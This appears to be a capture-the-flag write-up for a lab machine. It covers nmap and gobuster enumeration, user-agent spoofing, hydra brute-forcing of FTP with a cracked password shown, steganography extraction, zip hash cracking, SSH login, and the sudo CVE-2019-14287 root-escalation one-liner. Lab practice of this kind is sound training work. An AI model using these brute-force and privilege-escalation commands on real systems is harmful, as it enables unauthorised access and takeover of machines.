first run nmap	
	nmap -sV -sV -vv -p- 10.10.202.40
	we see we have 3 ports open
	lets try to do anonymous on ftp
		that doesnt seem to work
Run a directory buster on the site
	gobuster dir -u 10.10.202.40 -w /usr/share/wordlists/dirb/big.txt -x php,http,txt,zip
We can see that there is an agent R, lets see if there are other agents
	curl -A "R" -L 10.10.202.40
	We can see there are 25 other agents, 26 letters in the alphabet
	lets start to go through the different ones
	        curl -A "A" -L 10.10.202.40
	        curl -A "C" -L 10.10.202.40
			Agent C gives us a different message
			Lets go to agent J
				he doesnt give us any information but we 
				do know that Agent C has a weak password
		Since we know his password is weak, lets use that against hydra
		and first try to get the ftp login information
	hydra -l c -P /usr/share/wordlists/rockyou.txt 10.10.202.40 ftp
	c as the username didnt show us anything, however, we did figure out his
	real name is chris
		hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.202.40 ftp
	Alright!!! we have a password!!!
		[21][ftp] host: 10.10.202.40   login: chris   password: crystal
	lets get all of the ftp files that we found
		get xxxxxxxx.xxx
	Go back to terminal and lets see what they say
	open To_agentJ.txt
		looks like we have steganography, very exciting
		binwalk cutie.png 
			we find a To_agentR.txt file
			lets go there
			binwalk -e cutie.png (extracts the file)
			cd _cutie.png.extracted/
			ls
			we now see a zip file that is encrypted (it is in red) and the agentR.txt
				nothing in the agentr.txt file, lets decrypt the 8702.zip file using john the ripper
			sudo zip2john 8702.zip > zip.hash
			sudo john zip.hash
				we can now see the password for the zip file is alien
			lets unzip the file, 7z e 8702.zip
				as we can see it overwrites the agentR.txt file
				reopen agentR.txt and we can more writing
			had to look up what type of hash that was, however we can see now that it is a base 64 hash
				decode it on the internet and we get Area51
	We still have the cute-alien.jpg file, lets look into that
		sudo apt-get install steghide (this will allow us to see if anything is hidden within the jpg file that we could not find before)
			steghide info cute-alien.jpg
			steghide extract -sf cute-alien.jpg 
				less message.txt
	We now have a login for another user, james and his password hackerrules!
		we already did an FTP, lets do an SSH
			ssh james@10.10.202.40
			ls -la
		user flag.txt file
		We also see an image, do a reverse lookup on the image using the following command
			scp james@10.10.202.40:Alien_autospy.jpg /localdir/
		just search for Alien_autospy.jpg on google with fox news. You will see the rosewill experiment
now lets do sudo -l for james
to check version of sudo type sudo -V
now we can see there is a vulnerability for sudo version 1.8.21p2
	 	CVE-2019-14287
		https://nvd.nist.gov/vuln/detail/CVE-2019-14287#:~:text=CVE-2019-14287%20Detail&text=In%20Sudo%20before%201.8.,with%20a%20crafted%20user%20ID.
			sudo -u \#$((0xffffffff)) /bin/bash
		Now cd to /root/
			open root.txt
		we find the last flag and name
